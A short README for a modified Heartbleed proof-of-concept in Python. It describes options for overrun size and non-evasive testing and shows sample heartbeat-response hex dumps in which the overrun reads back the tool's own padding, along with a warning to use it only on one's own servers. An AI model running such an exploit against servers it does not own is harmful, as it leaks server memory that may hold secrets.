python-heartbleed
=================

My modifications to the heartbleed python poc.  I've included an option -e to perform non-evasive tests.
Never the less the program can do 64kb heartbleeds, so please be careful and only use this on servers you own (or the cloudflarechallenge).

With overrun of 1 and size of 32 responses look like this:
Received heartbeat response:
  0000: 02 00 0E 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C  ...LLLLLLLLLLLLL
  0010: 50 91 BB DA EB F0 98 0E 68 08 86 08 C9 C9 85 E5  P.......h.......
  0020: 97                                               .

With overrun of 8 and size of 4096 response would look like this:
  0fb0: 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C  LLLLLLLLLLLLLLLL
  0fc0: 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C  LLLLLLLLLLLLLLLL
  0fd0: 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C  LLLLLLLLLLLLLLLL
  0fe0: 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C 4C  LLLLLLLLLLLLLLLL
  0ff0: 50 50 50 50 50 50 50 50 56 0A 14 46 D6 65 E2 95  PPPPPPPPV..F.e..
  1000: D7 A0 24 B4 32 ED 56 FE                          ..$.2.V.

Note the extra P, we're overrunning the buffer and reading our own padding.
